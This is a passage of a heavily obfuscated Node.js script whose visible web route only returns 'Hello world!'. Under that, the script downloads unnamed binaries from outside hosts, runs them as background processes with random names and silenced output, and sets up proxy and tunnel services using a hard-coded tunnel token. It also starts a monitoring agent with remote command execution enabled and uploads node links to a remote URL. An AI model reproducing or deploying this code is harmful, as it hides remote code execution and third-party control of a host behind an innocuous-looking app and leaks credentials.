const _0x12b8bb=_0x4527;(function(_0x4b135a,_0x328709){const _0x381e36={_0x3ed86f:0xdd,_0x131ccf:0x125,_0x3d5145:0x122,_0x17b310:0xb6,_0x45b9f0:0x10c},_0x48072d=_0x4527,_0x24852b=_0x4b135a();while(!![]){try{const _0x2fc7d1=parseInt(_0x48072d(0x131))/0x1+parseInt(_0x48072d(_0x381e36._0x3ed86f))/0x2*(parseInt(_0x48072d(_0x381e36._0x131ccf))/0x3)+parseInt(_0x48072d(0xec))/0x4+parseInt(_0x48072d(0x158))/0x5*(parseInt(_0x48072d(_0x381e36._0x3d5145))/0x6)+-parseInt(_0x48072d(0x103))/0x7*(parseInt(_0x48072d(_0x381e36._0x17b310))/0x8)+parseInt(_0x48072d(0x9c))/0x9+parseInt(_0x48072d(_0x381e36._0x45b9f0))/0xa*(-parseInt(_0x48072d(0x152))/0xb);if(_0x2fc7d1===_0x328709)break;else _0x24852b['push'](_0x24852b['shift']());}catch(_0x37876e){_0x24852b['push'](_0x24852b['shift']());}}}(_0x5f2d,0x2e2e9));const express=require('express'),app=express(),axios=require(_0x12b8bb(0x124)),os=require('os'),fs=require('fs'),path=require(_0x12b8bb(0x133)),{promisify}=require(_0x12b8bb(0xca)),exec=promisify(require(_0x12b8bb(0x10f))[_0x12b8bb(0xaf)]),{execSync}=require(_0x12b8bb(0x10f)),UPLOAD_URL=process[_0x12b8bb(0xd9)][_0x12b8bb(0x123)]||'',PROJECT_URL=process[_0x12b8bb(0xd9)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x12b8bb(0xd9)][_0x12b8bb(0xed)]||![],FILE_PATH=process[_0x12b8bb(0xd9)][_0x12b8bb(0xc8)]||_0x12b8bb(0x134),SUB_PATH=process[_0x12b8bb(0xd9)][_0x12b8bb(0x15b)]||_0x12b8bb(0x11d),PORT=process[_0x12b8bb(0xd9)][_0x12b8bb(0xeb)]||process[_0x12b8bb(0xd9)][_0x12b8bb(0xd2)]||0xbb8,UUID=process[_0x12b8bb(0xd9)][_0x12b8bb(0x115)]||_0x12b8bb(0xb9),NEZHA_SERVER=process[_0x12b8bb(0xd9)][_0x12b8bb(0xae)]||'',NEZHA_PORT=process[_0x12b8bb(0xd9)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x12b8bb(0xd9)][_0x12b8bb(0x11a)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x12b8bb(0xaa),ARGO_AUTH=process['env'][_0x12b8bb(0x129)]||_0x12b8bb(0xb3),ARGO_PORT=process[_0x12b8bb(0xd9)][_0x12b8bb(0x149)]||0x1f41,CFIP=process[_0x12b8bb(0xd9)][_0x12b8bb(0xcb)]||_0x12b8bb(0x118),CFPORT=process[_0x12b8bb(0xd9)][_0x12b8bb(0xcc)]||0x1bb,NAME=process[_0x12b8bb(0xd9)][_0x12b8bb(0xe1)]||_0x12b8bb(0xdc);!fs[_0x12b8bb(0x13c)](FILE_PATH)?(fs[_0x12b8bb(0xe5)](FILE_PATH),console['log'](FILE_PATH+_0x12b8bb(0xbe))):console[_0x12b8bb(0x11f)](FILE_PATH+_0x12b8bb(0x139));function generateRandomName(){const _0x3165d2={_0x45f82c:0x121,_0x23d700:0xe8,_0x588016:0x11b},_0x588f1a=_0x12b8bb,_0x672524='abcdefghijklmnopqrstuvwxyz';let _0x175ebb='';for(let _0x5838d1=0x0;_0x5838d1<0x6;_0x5838d1++){_0x175ebb+=_0x672524[_0x588f1a(_0x3165d2._0x45f82c)](Math[_0x588f1a(_0x3165d2._0x23d700)](Math[_0x588f1a(_0x3165d2._0x588016)]()*_0x672524[_0x588f1a(0x9e)]));}return _0x175ebb;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x12b8bb(0xbf)](FILE_PATH,npmName),phpPath=path[_0x12b8bb(0xbf)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x12b8bb(0xbf)](FILE_PATH,botName),subPath=path[_0x12b8bb(0xbf)](FILE_PATH,'sub.txt'),listPath=path[_0x12b8bb(0xbf)](FILE_PATH,_0x12b8bb(0x9a)),bootLogPath=path[_0x12b8bb(0xbf)](FILE_PATH,_0x12b8bb(0x142)),configPath=path['join'](FILE_PATH,_0x12b8bb(0x154));function deleteNodes(){const _0xa57b61={_0x2cf169:0x13c,_0x53694c:0x140,_0x25c17b:0xbd,_0x3f74d7:0x145},_0xfa9e2b=_0x12b8bb;try{if(!UPLOAD_URL)return;if(!fs[_0xfa9e2b(_0xa57b61._0x2cf169)](subPath))return;let _0x226877;try{_0x226877=fs[_0xfa9e2b(_0xa57b61._0x53694c)](subPath,_0xfa9e2b(_0xa57b61._0x25c17b));}catch{return null;}const _0x2e8445=Buffer[_0xfa9e2b(0xb8)](_0x226877,_0xfa9e2b(0x113))[_0xfa9e2b(0xb7)](_0xfa9e2b(0xbd)),_0x1ab0c1=_0x2e8445['split']('\x0a')['filter'](_0x85f9fc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xfa9e2b(0xc4)](_0x85f9fc));if(_0x1ab0c1[_0xfa9e2b(0x9e)]===0x0)return;return axios['post'](UPLOAD_URL+_0xfa9e2b(_0xa57b61._0x3f74d7),JSON['stringify']({'nodes':_0x1ab0c1}),{'headers':{'Content-Type':'application/json'}})[_0xfa9e2b(0x15c)](_0xc622dc=>{return null;}),null;}catch(_0x430c42){return null;}}function cleanupOldFiles(){const _0x564b76={_0x2156ea:0xf6},_0x5a4c8a={_0x401217:0xbf},_0x598de3=_0x12b8bb;try{const _0x4ec03f=fs[_0x598de3(_0x564b76._0x2156ea)](FILE_PATH);_0x4ec03f[_0x598de3(0xa0)](_0x34354c=>{const _0x422a78=_0x598de3,_0x32618a=path[_0x422a78(_0x5a4c8a._0x401217)](FILE_PATH,_0x34354c);try{const _0x136292=fs['statSync'](_0x32618a);_0x136292[_0x422a78(0x108)]()&&fs[_0x422a78(0xa2)](_0x32618a);}catch(_0x3fd1cb){}});}catch(_0x4a8092){}}app[_0x12b8bb(0x102)]('/',function(_0x38adf6,_0x141340){const _0x159a7b={_0x518b4a:0xd6},_0x227997=_0x12b8bb;_0x141340[_0x227997(_0x159a7b._0x518b4a)]('Hello\x20world!');});function _0x5f2d(){const _0x3655eb=['\x0a\x20\x20\x20\x20','tunnel.json','data','tls','2096','railway.dlcc.de5.net','https://arm64.ssss.nyc.mn/agent','stream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA_SERVER','exec','unlink','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','eyJhIjoiYzIxMTI5ZGJkZTUwYjdjNzg5NDBmOGRmNWRhN2Q2N2IiLCJ0IjoiNGIwMTNiNGYtMjI3NC00MjE2LTlhYjktNTQzYmMwMjgzNDQ0IiwicyI6Ik5HSTNOak0xTVdVdFpETXpPUzAwTlRjd0xUZzFNbVF0TW1RNVltWXpaVGRtWlRrMCJ9','/tunnel.yml\x20run','nohup\x20','8Srbgmt','toString','from','ccc9825c-b2be-4d63-81c2-80b32efbdf19','quic','\x20-c\x20\x22','\x0a\x20\x20credentials-file:\x20','utf-8','\x20is\x20created','join','response','basename','fileName','tunnel.yml','test','--tls','vless','php\x20running\x20error:\x20','FILE_PATH','listen','util','CFIP','CFPORT','filter','close','\x20is\x20running','firefox','web\x20running\x20error:\x20','PORT','error','rm\x20-rf\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','send','stringify','application/json','env','true','none','Railway','2HzNqqI','chmod','https+local://8.8.8.8/dns-query','trojan','NAME','aarch64','https://amd64.ssss.nyc.mn/web','unshift','mkdirSync','automatic\x20access\x20task\x20added\x20successfully','all','floor','/vmess-argo','Add\x20automatic\x20access\x20task\x20faild:\x20','SERVER_PORT','1175004TLXEYF','AUTO_ACCESS','443','NEZHA\x20variable\x20is\x20empty,skip\x20running','win32','includes','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0aclient_secret:\x20','https://oooo.serv00.net/add-url','blackhole','readdirSync','https://arm64.ssss.nyc.mn/v1','/sub.txt\x20saved\x20successfully','2053','ARGO_DOMAIN:','/vless-argo','\x20successfully','del\x20/f\x20/q\x20','&fp=firefox&type=ws&host=','Skipping\x20adding\x20automatic\x20access\x20task','/dev/null','then','get','2006347gXFvWL','freedom','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Error\x20downloading\x20files:','Empowerment\x20failed\x20for\x20','isFile','writeFileSync','clear','Download\x20','120FpRxxK','\x20-s\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','child_process','/api/add-nodes','TunnelSecret','?encryption=none&security=tls&sni=','base64','\x20>/dev/null\x202>&1','UUID','npm\x20running\x20error:\x20','\x20failed:\x20','cdns.doon.eu.org','https://arm64.ssss.nyc.mn/web','NEZHA_KEY','random','Nodes\x20uploaded\x20successfully','sub','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','log','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','charAt','198xuSOeb','UPLOAD_URL','axios','89307OmJpFS','127.0.0.1','config.yaml','http\x20server\x20is\x20running\x20on\x20port:','ARGO_AUTH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','.exe\x20>\x20nul\x202>&1','taskkill\x20/f\x20/im\x20','platform','\x0a\x20\x20tunnel:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','42795PjIJvC','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','path','./tmp','arm','/api/add-subscriptions','\x20>/dev/null\x202>&1\x20&','tcp','\x20already\x20exists','message','2087','existsSync','pipe','2083','block','readFileSync','push','boot.log','amd','arch','/api/delete-nodes','status','has','8443','ARGO_PORT','\x0avless://','post','Content-Type','\x20>\x20nul\x202>&1','\x22\x20>\x20/dev/null\x202>&1','false','trim','split','99649QmyOwa','fileUrl','config.json','http','Error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','27095UWCmKq','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-c\x20','SUB_PATH','catch','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pkill\x20-f\x20\x22[','App\x20is\x20running','list.txt','pop','354132LWJdUs','?security=tls&sni=','length','https://amd64.ssss.nyc.mn/agent','forEach','match','unlinkSync','Error\x20executing\x20command:\x20','set'];_0x5f2d=function(){return _0x3655eb;};return _0x5f2d();}async function generateConfig(){const _0x29c85f={_0x325db9:0x100,_0xdd75a9:0xe9,_0x3a86a0:0x138,_0x3d60af:0x126,_0x13628c:0xdb,_0x521246:0xc6,_0x33117b:0xa8,_0x534ffd:0x126,_0x446bfc:0xe0,_0x1aa4ad:0xdf,_0x4a749c:0x104,_0x39700b:0xf5,_0x2bda59:0xd7},_0x2a81b2=_0x12b8bb,_0xdd90c={'log':{'access':_0x2a81b2(0x100),'error':_0x2a81b2(_0x29c85f._0x325db9),'loglevel':_0x2a81b2(0xdb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2a81b2(0xc6),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x2a81b2(0xdb),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2a81b2(_0x29c85f._0xdd75a9),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2a81b2(_0x29c85f._0x3a86a0)}},{'port':0xbb9,'listen':_0x2a81b2(_0x29c85f._0x3d60af),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2a81b2(0x138),'security':_0x2a81b2(_0x29c85f._0x13628c)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2a81b2(_0x29c85f._0x521246),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2a81b2(0xfb)}},'sniffing':{'enabled':!![],'destOverride':[_0x2a81b2(0x155),_0x2a81b2(_0x29c85f._0x33117b),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2a81b2(0x155),'tls',_0x2a81b2(0xba)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2a81b2(_0x29c85f._0x534ffd),'protocol':_0x2a81b2(_0x29c85f._0x446bfc),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2a81b2(0x155),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x2a81b2(_0x29c85f._0x1aa4ad)]},'outbounds':[{'protocol':_0x2a81b2(_0x29c85f._0x4a749c),'tag':'direct'},{'protocol':_0x2a81b2(_0x29c85f._0x39700b),'tag':_0x2a81b2(0x13f)}]};fs[_0x2a81b2(0x109)](path[_0x2a81b2(0xbf)](FILE_PATH,_0x2a81b2(0x154)),JSON[_0x2a81b2(_0x29c85f._0x2bda59)](_0xdd90c,null,0x2));}function getSystemArchitecture(){const _0x4e5e45={_0x1ac055:0x135,_0x14a333:0x143},_0xe89f77=_0x12b8bb,_0x442fcc=os[_0xe89f77(0x144)]();return _0x442fcc===_0xe89f77(_0x4e5e45._0x1ac055)||_0x442fcc==='arm64'||_0x442fcc===_0xe89f77(0xe2)?_0xe89f77(0x135):_0xe89f77(_0x4e5e45._0x14a333);}function downloadFile(_0x5d2d5f,_0x28c998,_0x3de9f0){const _0x2be9ab={_0x1e20bb:0x101},_0x50129f={_0x36c915:0x13a,_0x1ccf52:0xd3},_0x14365c={_0x105224:0x13d,_0x43bab3:0xd3},_0x3d29b5=_0x12b8bb,_0x191620=_0x5d2d5f;!fs[_0x3d29b5(0x13c)](FILE_PATH)&&fs[_0x3d29b5(0xe5)](FILE_PATH,{'recursive':!![]});const _0xd5b908=fs['createWriteStream'](_0x191620);axios({'method':'get','url':_0x28c998,'responseType':_0x3d29b5(0xac)})[_0x3d29b5(_0x2be9ab._0x1e20bb)](_0x4c67e0=>{const _0x3a8d7b={_0x16346d:0xb0,_0x14cfd8:0x10b,_0x32e717:0xc1,_0x43ceff:0xd3},_0x26c525={_0x10aae9:0xce,_0xd5b980:0xc1},_0x530af3=_0x3d29b5;_0x4c67e0[_0x530af3(0xa7)][_0x530af3(_0x14365c._0x105224)](_0xd5b908),_0xd5b908['on']('finish',()=>{const _0x2e1eb3=_0x530af3;_0xd5b908[_0x2e1eb3(_0x26c525._0x10aae9)](),console[_0x2e1eb3(0x11f)]('Download\x20'+path[_0x2e1eb3(_0x26c525._0xd5b980)](_0x191620)+_0x2e1eb3(0xfc)),_0x3de9f0(null,_0x191620);}),_0xd5b908['on'](_0x530af3(_0x14365c._0x43bab3),_0x894ec1=>{const _0x3ddb0e=_0x530af3;fs[_0x3ddb0e(_0x3a8d7b._0x16346d)](_0x191620,()=>{});const _0x5f17ac=_0x3ddb0e(_0x3a8d7b._0x14cfd8)+path[_0x3ddb0e(_0x3a8d7b._0x32e717)](_0x191620)+_0x3ddb0e(0x117)+_0x894ec1[_0x3ddb0e(0x13a)];console[_0x3ddb0e(_0x3a8d7b._0x43ceff)](_0x5f17ac),_0x3de9f0(_0x5f17ac);});})['catch'](_0xacb8cd=>{const _0x4e7a5a=_0x3d29b5,_0x432b7a='Download\x20'+path[_0x4e7a5a(0xc1)](_0x191620)+'\x20failed:\x20'+_0xacb8cd[_0x4e7a5a(_0x50129f._0x36c915)];console[_0x4e7a5a(_0x50129f._0x1ccf52)](_0x432b7a),_0x3de9f0(_0x432b7a);});}async function downloadFilesAndRun(){const _0x598e5f={_0x52174b:0x159,_0x141085:0xe7,_0x43eb5a:0x9b,_0x4fc40d:0xee,_0x402d1d:0x13e,_0x1b2357:0x147,_0x8cd821:0xda,_0x5029c2:0x14f,_0x221ef7:0x97,_0x4ccdfb:0x127,_0x184e30:0xb5,_0x423f1b:0x11f,_0x52a6da:0xd3,_0x561729:0xa9,_0x12c840:0x13b,_0x3a3f76:0xc5,_0x469ca3:0x10d,_0x38c60c:0xb1,_0xc4d1bb:0x11f,_0xae9e78:0x116,_0x1a4727:0xd3,_0xc0baec:0x13c,_0x498d93:0xa1,_0x21414f:0xb4,_0x1ec2a7:0x11f,_0x50f86e:0xa3},_0x2406d1={_0xe80e44:0xde},_0x4d1b05=_0x12b8bb,_0x4894e5=getSystemArchitecture(),_0x5f1871=getFilesForArchitecture(_0x4894e5);if(_0x5f1871['length']===0x0){console[_0x4d1b05(0x11f)](_0x4d1b05(_0x598e5f._0x52174b));return;}const _0x17f218=_0x5f1871['map'](_0x5ef0f3=>{const _0xcbf8ef={_0x23f9e7:0x153};return new Promise((_0xa47ab3,_0x3069de)=>{const _0x29f67a=_0x4527;downloadFile(_0x5ef0f3[_0x29f67a(0xc2)],_0x5ef0f3[_0x29f67a(_0xcbf8ef._0x23f9e7)],(_0x35bb3a,_0x10eb37)=>{_0x35bb3a?_0x3069de(_0x35bb3a):_0xa47ab3(_0x10eb37);});});});try{await Promise[_0x4d1b05(_0x598e5f._0x141085)](_0x17f218);}catch(_0x1bddbc){console['error'](_0x4d1b05(0x106),_0x1bddbc);return;}function _0x3782c2(_0x1ff213){const _0x54275f={_0x1be0ca:0x107,_0x9f151a:0x11f},_0x42993c=0x1fd;_0x1ff213['forEach'](_0x29de29=>{const _0x2e36c8=_0x4527;fs[_0x2e36c8(0x13c)](_0x29de29)&&fs[_0x2e36c8(_0x2406d1._0xe80e44)](_0x29de29,_0x42993c,_0x3d48bb=>{const _0x17a0ca=_0x2e36c8;_0x3d48bb?console[_0x17a0ca(0xd3)](_0x17a0ca(_0x54275f._0x1be0ca)+_0x29de29+':\x20'+_0x3d48bb):console[_0x17a0ca(_0x54275f._0x9f151a)]('Empowerment\x20success\x20for\x20'+_0x29de29+':\x20'+_0x42993c[_0x17a0ca(0xb7)](0x8));});});}const _0x4dc3d7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3782c2(_0x4dc3d7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x13b77b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4d1b05(0x151)](':')[_0x4d1b05(_0x598e5f._0x43eb5a)]():'',_0x7c4270=new Set([_0x4d1b05(_0x598e5f._0x4fc40d),_0x4d1b05(0x148),_0x4d1b05(0xa9),_0x4d1b05(0x13b),_0x4d1b05(_0x598e5f._0x402d1d),_0x4d1b05(0xf9)]),_0x32274a=_0x7c4270[_0x4d1b05(_0x598e5f._0x1b2357)](_0x13b77b)?_0x4d1b05(_0x598e5f._0x8cd821):_0x4d1b05(_0x598e5f._0x5029c2),_0x2e58bc=_0x4d1b05(0xf3)+NEZHA_KEY+_0x4d1b05(0xb2)+NEZHA_SERVER+_0x4d1b05(0x12a)+_0x32274a+_0x4d1b05(_0x598e5f._0x221ef7)+UUID;fs['writeFileSync'](path[_0x4d1b05(0xbf)](FILE_PATH,_0x4d1b05(_0x598e5f._0x4ccdfb)),_0x2e58bc);const _0x1f0248=_0x4d1b05(_0x598e5f._0x184e30)+phpPath+_0x4d1b05(0xbb)+FILE_PATH+_0x4d1b05(0x120);try{await exec(_0x1f0248),console[_0x4d1b05(_0x598e5f._0x423f1b)](phpName+_0x4d1b05(0xcf)),await new Promise(_0x4a5f27=>setTimeout(_0x4a5f27,0x3e8));}catch(_0x5aff29){console[_0x4d1b05(_0x598e5f._0x52a6da)](_0x4d1b05(0xc7)+_0x5aff29);}}else{let _0x1a9cdb='';const _0x269bac=[_0x4d1b05(0xee),_0x4d1b05(0x148),_0x4d1b05(_0x598e5f._0x561729),_0x4d1b05(_0x598e5f._0x12c840),_0x4d1b05(0x13e),_0x4d1b05(0xf9)];_0x269bac['includes'](NEZHA_PORT)&&(_0x1a9cdb=_0x4d1b05(_0x598e5f._0x3a3f76));const _0x482636=_0x4d1b05(_0x598e5f._0x184e30)+npmPath+_0x4d1b05(_0x598e5f._0x469ca3)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1a9cdb+_0x4d1b05(_0x598e5f._0x38c60c);try{await exec(_0x482636),console[_0x4d1b05(_0x598e5f._0xc4d1bb)](npmName+_0x4d1b05(0xcf)),await new Promise(_0x289160=>setTimeout(_0x289160,0x3e8));}catch(_0x32d4b3){console[_0x4d1b05(0xd3)](_0x4d1b05(_0x598e5f._0xae9e78)+_0x32d4b3);}}}else console[_0x4d1b05(0x11f)](_0x4d1b05(0xef));const _0x3c7c69='nohup\x20'+webPath+_0x4d1b05(0x15a)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3c7c69),console[_0x4d1b05(0x11f)](webName+'\x20is\x20running'),await new Promise(_0x1b0f14=>setTimeout(_0x1b0f14,0x3e8));}catch(_0xf460ba){console[_0x4d1b05(_0x598e5f._0x1a4727)](_0x4d1b05(0xd1)+_0xf460ba);}if(fs[_0x4d1b05(_0x598e5f._0xc0baec)](botPath)){let _0x31339e;if(ARGO_AUTH[_0x4d1b05(_0x598e5f._0x498d93)](/^[A-Z0-9a-z=]{120,250}$/))_0x31339e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x31339e=_0x4d1b05(0xf2)+FILE_PATH+_0x4d1b05(_0x598e5f._0x21414f):_0x31339e=_0x4d1b05(0x10e)+FILE_PATH+_0x4d1b05(0x157)+ARGO_PORT;try{await exec(_0x4d1b05(0xb5)+botPath+'\x20'+_0x31339e+'\x20>/dev/null\x202>&1\x20&'),console[_0x4d1b05(_0x598e5f._0x1ec2a7)](botName+_0x4d1b05(0xcf)),await new Promise(_0x5f0e67=>setTimeout(_0x5f0e67,0x7d0));}catch(_0x247d91){console['error'](_0x4d1b05(_0x598e5f._0x50f86e)+_0x247d91);}}await new Promise(_0x4455ee=>setTimeout(_0x4455ee,0x1388));}function getFilesForArchitecture(_0x4251e7){const _0x91c4d3={_0x2c1c08:0x9f,_0x5e9804:0xf7,_0x29367c:0xe4},_0x3bb886=_0x12b8bb;let _0x422abd;_0x4251e7==='arm'?_0x422abd=[{'fileName':webPath,'fileUrl':_0x3bb886(0x119)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x422abd=[{'fileName':webPath,'fileUrl':_0x3bb886(0xe3)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x549fdb=_0x4251e7===_0x3bb886(0x135)?_0x3bb886(0xab):_0x3bb886(_0x91c4d3._0x2c1c08);_0x422abd[_0x3bb886(0xe4)]({'fileName':npmPath,'fileUrl':_0x549fdb});}else{const _0x5330f0=_0x4251e7===_0x3bb886(0x135)?_0x3bb886(_0x91c4d3._0x5e9804):'https://amd64.ssss.nyc.mn/v1';_0x422abd[_0x3bb886(_0x91c4d3._0x29367c)]({'fileName':phpPath,'fileUrl':_0x5330f0});}}return _0x422abd;}function argoType(){const _0x28c4e8={_0x36f683:0xd5,_0x17e9b1:0xf1,_0x38b6f0:0x111,_0x53a408:0x109,_0x5d81e5:0xbf,_0x54d85a:0xa6,_0x2027e6:0x12e,_0x497831:0xbc,_0x56f0c1:0x130,_0x155a91:0x11f},_0x58609f=_0x12b8bb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x58609f(0x11f)](_0x58609f(_0x28c4e8._0x36f683));return;}if(ARGO_AUTH[_0x58609f(_0x28c4e8._0x17e9b1)](_0x58609f(_0x28c4e8._0x38b6f0))){fs[_0x58609f(_0x28c4e8._0x53a408)](path[_0x58609f(_0x28c4e8._0x5d81e5)](FILE_PATH,_0x58609f(_0x28c4e8._0x54d85a)),ARGO_AUTH);const _0x1d778f=_0x58609f(_0x28c4e8._0x2027e6)+ARGO_AUTH['split']('\x22')[0xb]+_0x58609f(_0x28c4e8._0x497831)+path[_0x58609f(0xbf)](FILE_PATH,_0x58609f(0xa6))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x58609f(_0x28c4e8._0x56f0c1)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x58609f(0x109)](path['join'](FILE_PATH,_0x58609f(0xc3)),_0x1d778f);}else console[_0x58609f(_0x28c4e8._0x155a91)](_0x58609f(0x11e));}argoType();async function extractDomains(){const _0x36d32d={_0x2ac103:0x11f,_0x2eb153:0xfa,_0x536659:0x142,_0x58f839:0xbd,_0x3e5613:0x11f,_0x41db92:0x11f,_0x2df7d7:0xad,_0x5a6baf:0xa2,_0x1cc7c0:0xbf,_0x49a211:0xb5,_0x5e94ab:0xcf,_0x4d55fb:0xd3},_0x5f0a61={_0x5229ad:0x150},_0x43ac93={_0x54e37a:0x12d,_0x3e50b8:0xf0,_0x3fe710:0x12c,_0x418696:0x121},_0x2da61b={_0x2dbaec:0x141},_0x545966=_0x12b8bb;let _0x125424;if(ARGO_AUTH&&ARGO_DOMAIN)_0x125424=ARGO_DOMAIN,console[_0x545966(_0x36d32d._0x2ac103)](_0x545966(_0x36d32d._0x2eb153),_0x125424),await _0x5051d2(_0x125424);else try{const _0x45a585=fs[_0x545966(0x140)](path['join'](FILE_PATH,_0x545966(_0x36d32d._0x536659)),_0x545966(_0x36d32d._0x58f839)),_0x5607f4=_0x45a585[_0x545966(0x151)]('\x0a'),_0x25d277=[];_0x5607f4[_0x545966(0xa0)](_0x21db85=>{const _0x4d96f3=_0x545966,_0x5e5cf9=_0x21db85[_0x4d96f3(0xa1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5e5cf9){const _0x50bf7c=_0x5e5cf9[0x1];_0x25d277[_0x4d96f3(_0x2da61b._0x2dbaec)](_0x50bf7c);}});if(_0x25d277['length']>0x0)_0x125424=_0x25d277[0x0],console[_0x545966(_0x36d32d._0x3e5613)]('ArgoDomain:',_0x125424),await _0x5051d2(_0x125424);else{console[_0x545966(_0x36d32d._0x41db92)](_0x545966(_0x36d32d._0x2df7d7)),fs[_0x545966(_0x36d32d._0x5a6baf)](path[_0x545966(_0x36d32d._0x1cc7c0)](FILE_PATH,_0x545966(_0x36d32d._0x536659)));async function _0xc22afb(){const _0x2e3808=_0x545966;try{process[_0x2e3808(_0x43ac93._0x54e37a)]===_0x2e3808(_0x43ac93._0x3e50b8)?await exec(_0x2e3808(_0x43ac93._0x3fe710)+botName+_0x2e3808(0x12b)):await exec(_0x2e3808(0x98)+botName[_0x2e3808(_0x43ac93._0x418696)](0x0)+']'+botName['substring'](0x1)+_0x2e3808(0x14e));}catch(_0x4b13de){}}_0xc22afb(),await new Promise(_0x39f7aa=>setTimeout(_0x39f7aa,0xbb8));const _0x4ed5a3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x545966(0x157)+ARGO_PORT;try{await exec(_0x545966(_0x36d32d._0x49a211)+botPath+'\x20'+_0x4ed5a3+_0x545966(0x137)),console[_0x545966(0x11f)](botName+_0x545966(_0x36d32d._0x5e94ab)),await new Promise(_0x2d14c6=>setTimeout(_0x2d14c6,0xbb8)),await extractDomains();}catch(_0x1b74fe){console[_0x545966(0xd3)]('Error\x20executing\x20command:\x20'+_0x1b74fe);}}}catch(_0x92b0be){console[_0x545966(_0x36d32d._0x4d55fb)]('Error\x20reading\x20boot.log:',_0x92b0be);}async function _0x5051d2(_0x2f37af){const _0x29f41b=_0x545966,_0x5706c7=execSync(_0x29f41b(0x105),{'encoding':'utf-8'}),_0x5960c9=_0x5706c7[_0x29f41b(_0x5f0a61._0x5229ad)](),_0x172811=NAME?NAME+'-'+_0x5960c9:_0x5960c9;return new Promise(_0x568066=>{const _0x3756cd={_0x23c370:0xa8,_0x7fdc62:0x14a,_0x4e08fe:0xfe,_0x2d5c78:0xd7,_0x18eb98:0x113,_0x31727f:0x12f,_0x5b0298:0xa5,_0x537128:0xb7,_0xcd17c1:0x102};setTimeout(()=>{const 